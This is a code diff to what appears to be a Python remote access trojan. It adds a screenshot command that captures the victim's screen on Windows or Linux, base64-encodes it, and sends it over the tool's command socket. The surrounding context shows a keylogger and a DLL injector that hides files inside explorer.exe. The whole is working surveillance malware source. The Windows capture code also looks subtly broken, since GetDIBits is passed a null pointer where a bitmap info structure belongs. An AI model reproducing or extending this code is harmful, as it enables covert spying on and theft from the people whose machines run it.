@@ -349,6 +349,138 @@ def kl_start():
 
 
 # ══════════════════════════════════════════════════════
+# 螢幕截圖 (Screenshot)
+# ══════════════════════════════════════════════════════
+
+def take_screenshot():
+    """
+    擷取螢幕截圖並回傳 base64 編碼的 PNG 圖片。
+
+    — Windows: 使用 ctypes 呼叫 gdi32.dll (BitBlt)
+    — Linux:   使用 subprocess 呼叫 scrot 或 import gtk
+    — 若失敗，回傳錯誤訊息
+    """
+    try:
+        if sys.platform.startswith("win"):
+            return _screenshot_windows()
+        elif sys.platform.startswith("linux"):
+            return _screenshot_linux()
+        else:
+            return "[!!] Screenshot not supported on this platform."
+    except Exception as e:
+        return f"[!!] Screenshot failed: {str(e)}"
+
+
+def _screenshot_windows():
+    """Windows: 使用 gdi32.dll BitBlt 截圖"""
+    import tempfile as _tf
+
+    # 取得螢幕尺寸
+    user32 = ctypes.windll.user32
+    width  = user32.GetSystemMetrics(0)
+    height = user32.GetSystemMetrics(1)
+
+    # 建立 DC
+    hdc_screen = user32.GetDC(0)
+    hdc_mem = ctypes.windll.gdi32.CreateCompatibleDC(hdc_screen)
+    hbitmap = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
+    ctypes.windll.gdi32.SelectObject(hdc_mem, hbitmap)
+
+    # 複製螢幕內容
+    ctypes.windll.gdi32.BitBlt(
+        hdc_mem, 0, 0, width, height,
+        hdc_screen, 0, 0,
+        0x00CC0020  # SRCCOPY
+    )
+
+    # 儲存為 BMP → 轉 PNG
+    tmp_bmp = _tf.mktemp(suffix=".bmp")
+    _save_bitmap(hbitmap, tmp_bmp, width, height)
+
+    # 讀取並 base64 編碼
+    with open(tmp_bmp, "rb") as f:
+        img_data = f.read()
+
+    # 清理
+    os.unlink(tmp_bmp)
+    ctypes.windll.gdi32.DeleteObject(hbitmap)
+    ctypes.windll.gdi32.DeleteDC(hdc_mem)
+    user32.ReleaseDC(0, hdc_screen)
+
+    encoded = base64.b64encode(img_data).decode("ascii")
+    return f"[+] Screenshot captured ({width}x{height}, {len(img_data)} bytes)\n[IMG]{encoded}[/IMG]"
+
+
+def _save_bitmap(hbitmap, filepath, width, height):
+    """將 HBITMAP 儲存為 BMP 檔案"""
+    # BMP 檔案頭
+    bmp_header = struct.pack('<2sIHHI',
+        b'BM',
+        54 + width * height * 3,  # 檔案大小
+        0, 0, 54                    # 保留 + 資料偏移
+    )
+    # DIB 頭 (BITMAPINFOHEADER)
+    dib_header = struct.pack('<IiiHHIIiiII',
+        40,             # 結構大小
+        width, height,  # 寬高
+        1, 24,          # 色平面數, bits per pixel (24-bit)
+        0,              # 壓縮
+        width * height * 3,  # 圖片大小
+        2835, 2835,     # 解析度 (72 DPI)
+        0, 0            # 調色盤
+    )
+
+    # 讀取像素資料
+    buffer_size = width * height * 3
+    buffer = (ctypes.c_ubyte * buffer_size)()
+    ctypes.windll.gdi32.GetDIBits(
+        ctypes.windll.user32.GetDC(0), hbitmap, 0, height,
+        buffer, ctypes.byref(ctypes.c_void_p()), 0
+    )
+
+    # BMP 像素資料是 bottom-up，需要翻轉
+    row_size = width * 3
+    rows = [bytes(buffer[i * row_size:(i + 1) * row_size]) for i in range(height)]
+    rows.reverse()
+
+    with open(filepath, "wb") as f:
+        f.write(bmp_header)
+        f.write(dib_header)
+        for row in rows:
+            # BMP 每行需要 4-byte 對齊
+            padding = b'\x00' * ((4 - (len(row) % 4)) % 4)
+            f.write(row + padding)
+
+
+def _screenshot_linux():
+    """Linux: 使用 scrot 或 import gtk"""
+    import tempfile as _tf
+    tmp_png = _tf.mktemp(suffix=".png")
+
+    # 嘗試 scrot
+    result = subprocess.run(
+        ["scrot", tmp_png],
+        capture_output=True, timeout=10
+    )
+    if result.returncode != 0:
+        # 嘗試 gnome-screenshot
+        result = subprocess.run(
+            ["gnome-screenshot", "-f", tmp_png],
+            capture_output=True, timeout=10
+        )
+
+    if not os.path.exists(tmp_png):
+        return "[!!] Screenshot failed: install scrot or gnome-screenshot"
+
+    with open(tmp_png, "rb") as f:
+        img_data = f.read()
+    os.unlink(tmp_png)
+
+    encoded = base64.b64encode(img_data).decode("ascii")
+    return f"[+] Screenshot captured ({len(img_data)} bytes)\n[IMG]{encoded}[/IMG]"
+
+
+# ══════════════════════════════════════════════════════
 # DLL Injector：將 hidden.dll 注入 explorer.exe → 隱藏檔案
 # ══════════════════════════════════════════════════════
 
@@ -588,6 +720,10 @@ def communication(s):
                 reliable_send(s, f"[+] Program '{program}' Started.")
             except Exception:
                 reliable_send(s, "[!!] Program cannot start.")
+
+        elif command == "screenshot":
+            result_msg = take_screenshot()
+            reliable_send(s, result_msg)
 
         elif command == "kl_start":
             kl_thread = threading.Thread(target=kl_start, daemon=True)
